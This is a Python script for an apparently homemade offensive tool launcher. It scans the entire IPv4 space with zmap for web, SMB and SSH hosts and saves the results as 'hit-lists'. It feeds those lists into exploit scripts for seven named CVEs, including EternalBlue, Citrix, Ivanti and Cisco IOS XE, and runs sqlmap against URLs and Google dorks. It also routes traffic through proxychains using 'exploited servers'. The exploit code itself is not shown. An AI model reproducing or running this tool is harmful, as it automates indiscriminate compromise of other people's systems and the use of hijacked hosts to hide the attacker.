import os
import time

def banner():
    print('''
                          :::!~!!!!!:.
                      .xUHWH!! !!?M88WHX:.
                    .X*#M@$!!  !X!M$$$$$$WWx:.
                   :!!!!!!?H! :!$!$$$$$$$$$$8X:
                  !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
                 :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
                 ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                   !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                   ~?WuxiW*`   `"#$$$$8!!!!??!!!
                 :X- M$$$$       `"T#$T~!8$WUXU~
                :%`  ~#$$$m:        ~!~ ?$$$$$$
              :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
    .....   -~~:<` !    ~?T#$$@@W@*?$$      /`
    W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
    #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
    :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
    .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
    Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
    $R@i.~~ !     :   ~$$$$$B$$en:``
    ?MXT@Wx.~    :     ~"##*$$$$M~
    ''')
def banner1():
    print('''
    , , ,  ,,  , ___,_,,_      ,  , ___, ,   ,    _,,_  
    |_|,|  ||\ |' | /_,|_)     |_/ ' |   |   |   /_,|_) 
   '| |'\__||'\|  |'\_'| \    '| \  _|_,'|__'|__'\_'| \ 
    ' `    `'  `  '   `'  `    '  `'       '   '   `'  `
    ''')
    print("\n")

def help():       ## <--- Maybe change to LIST function and build new help?
    print("Tool Manager for Anon. surfing of the web")
    print("Follow the prompts below: \n")
    ##CVE-2017-0144  CVE-2022-29464  CVE-2023-20198  CVE-2023-23752  CVE-2023-3460  CVE-2023-35078  CVE-2023-3519 
    print("""
     ##### EXPLOITS #####   
        [-} CVE-2017-0144 (Eternal Blue)
        [-} CVE-2022-29464 (WSO2 RCE)
        [-} CVE-2023-20198 (Cisco IOS XE 0-Day)
        [-} CVE-2023-23752 (Joomla Exploit)
        [-} CVE-2023-3460 (WordPress Exploit)
        [-} CVE-2023-35078 (Ivanti Endpoint Exploit)
        [-} CVE-2023-3519 (Citrix ADC and Citrix Gateway Exploit)

        ---> 7 Exploits Loaded.
     #####   TOOLS  #####
        [-} Zmap (IoT Scanner)
        [-} Scraper Tool (My own sauce) 

        ---> 1 Tools Loaded.
        """)
    print("## Select an option: exploits or (e) / tools or (t) / install (i) ##") 
    print("                     scanner or (s)\n\n")

def installer():
    print("Running the Installer scripts, this could take some time......")
    time.sleep(2)
    os.system("sudo apt install zmap -y")
    print("Finished Zmap install!\n\n")
    os.system("sudo apt install proxychains -y")
    print("Finished proxychains install!\n\n")
    os.system("sudo apt install golang-go")
    print("Finished golang install")

def toolSelect():
    print('''
    You have selected the Tool Menu!

    [1} Configure ProxyChains
    [2} sqlmap

    ''')
    result = selectOption()
    if result in ('1'):
        print('Selected ProxyChains Config.\n')
        print('''
        Here is where you input the exploited servers into your proxylist.
        Ill eventually automate this, but in the name of speed you'll do it manually. 

        When you select this option it will open up a file called proxychains.conf 
        this is where you configure/set up your obfuscation network. 
        If you are confused google, 'how to add proxies to proxychains'
        



        *This message is displayed for 10 seconds
        ''')

        time.sleep(10)
        os.system('sudo nano /etc/proxychains.conf')
        main()
    elif result in ('2'):
        print('''
        Please select an option for sqlmap:

        [1} Single URL scan
        [2} Google Dork Scan
        [3} Back

        ''')
        x = input(':')
        if x in ('1'):
            url = input('URL: ')
            os.system(f'sudo sqlmap -u {url} --dbs')
            toolSelect()
        elif x in ('2'):
            dork = input('Google dork: ')
            os.system(f'sudo sqlmap -g {dork}')
        elif x in ('3'):
            main()
    else:
        exit



def exploitSelect():
    banner1()
    print("Exploit Selector Loaded:\n")
    print('''
    
    Please Select an Exploit to Use: 

    [1} CVE-2017-0144 (Eternal Blue)
    [2} CVE-2022-29464 (WSO2 RCE)
    [3} CVE-2023-20198 (Cisco IOS XE 0-Day)
    [4} CVE-2023-23752 (Joomla Exploit)
    [5} CVE-2023-3460 (WordPress Exploit)
    [6} CVE-2023-35078 (Ivanti Endpoint Exploit)
    [7} CVE-2023-3519 (Citrix ADC and Citrix Gateway Exploit)

    ''')
    result = selectOption()
    if result in ('1', 'blue'):
        print('Eternal Blue Selected')
        os.chdir("CVE-2017-0144")
        os.system('./escan')

    elif result in('2'):
        print('CVE-2022-29464 Selected')
        os.chdir('CVE-2022-29464')
        os.system('sudo python3 wso.py')

    elif result in('3'):
        print('CVE-2023-20198 Selected')
        os.chdir("CVE-2023-20198")
        os.system('sudo python3 exploit.py')

    elif result in('4'):
        print('CVE-2023-23752 Selected')
        os.chdir("CVE-2023-23752")
        os.system("sudo python3 main.py")

    elif result in('5'):
        print('CVE-2023-3460')
        os.chdir('CVE-2023-3460')
        print('''
        
        If the program is stuck/not moving hit CTRL + C
        


        SLLLLLLLLLLLLLLLLLLLLLLUMMMMMMMMMMPPED EM
        ''')
        os.system("sudo python3 exploit.py -l /opt/HKer/hit-lists/eb0.txt -c")

    elif result in('6'):
        print('CVE-2023-35078')
        os.chdir('CVE-2023-35078')
        os.system("sudo go run v1.go -f /opt/HKer/hit-lists/webOut0.txt")

    elif result in('7'):
        os.chdir('CVE-2023-3519')
        print('CVE-2023-3519')
        os.system("sudo python3 use.py")

    else:
        print("No valid option selected, you goofy rn?")
        


def scannerSelect():
    banner1()
    print("Target Collector Loaded: ") 
    print('''
    [1] Web Server Scraper
    [2] Eternal Blue Scraper (port 445)
    [3] SSH Scraper

    ''')
    result = selectOption()
    if result in ('1'):
        print("Web Server module selected")
        x = input("Please acknowledge, this will run for sometime. To stop hit Ctrl + C (y / n)\n")
        if x in ('y', 'yes'):
            os.system('sudo zmap -p80 1.0.0.0/16 -o hit-lists/webOut0.txt -B100m')
            print('Finished first round of collections, saved to: webOut0.txt')
            time.sleep(2)
            print('Starting Round 2')
            os.system('sudo zmap -p80 2.0.0.0/16 -o hit-lists/webOut1.txt -B100m')
            time.sleep(2)
            print('Starting Final Round')
            os.system('sudo zmap -p80 3.0.0.0/16 -o hit-lists/webOut2.txt -B100m')

            print('''
            Finished collecting the hit-lists... 
            Check your hit-lists directory for the files,
            you can edit the code to expand the ranges and hit
            more servers/pcs.

            Check lines 77-84 of the code to figure out what to change. 
            ''')
        else:
            exit

    elif result in ('2'):
        print("Eternal Blue Scraper selected\n")
        print('''
        

        BE WARNED, THIS IS SCANNING THE WHOLE INTERNET (0.0.0.0/0) 
        IF LEFT ALONE THIS WILL RUN FOR DAYS. 
        BEST TO RUN FOR AN HOUR OR TWO THEN STOP WITH:
        CTRL + C

        The list of potential hits is saved to the file "eB0.txt"


        ''')
        time.sleep(3)
        os.system('sudo zmap -p445 0.0.0.0/0 -o hit-lists/eB0.txt -B100M')
        print('Finished collecting the hit-lists...\n\n\n"')

    elif result in ('3'):
        print("SSH Scraper selected")
        time.sleep(3)
        print('''


        BE WARNED, THIS IS SCANNING THE WHOLE INTERNET (0.0.0.0/0)
        IF LEFT ALONE THIS WILL RUN FOR DAYS.
        BEST TO RUN FOR AN HOUR OR TWO THEN STOP WITH:
        CTRL + C
        The list of potential hits is saved to the file "ssh0.txt"

        ''')
        os.system('sudo zmap -p22 0.0.0.0/0 -o hit-lists/ssh0.txt -B100m')
        print('Finished collecting the hit-lists...\n\n\n"')
    else:
        print("Please selected an option, not whatever the fuck that was")

def selectOption():
    option = input("Please Select an option:  \n")
    return option

def main():
    banner()
    banner1()
    print("## Select an option: exploits or (e) / tools or (t) / install (i) / help (h) / scanner (s) ##")
    result = selectOption()
    print(f"You selected: {result}")
    if result in ('exploits', 'e'):
        print("selected exploits")
        exploitSelect() 
    elif result in ('tools', 't'):
        print("Selected tools\n")
        toolSelect()
    elif result in ('install', 'i'):
        print("selected install")
        installer()

    elif result in ('scanner', 's'):
        scannerSelect()

    elif result in ('help', 'h'):
        help()
        time.sleep(4)
        main()

    else:
        print("Please Select either (t), (i), (s) or (e) and rerun the program\n")


if __name__ == "__main__":
    main()
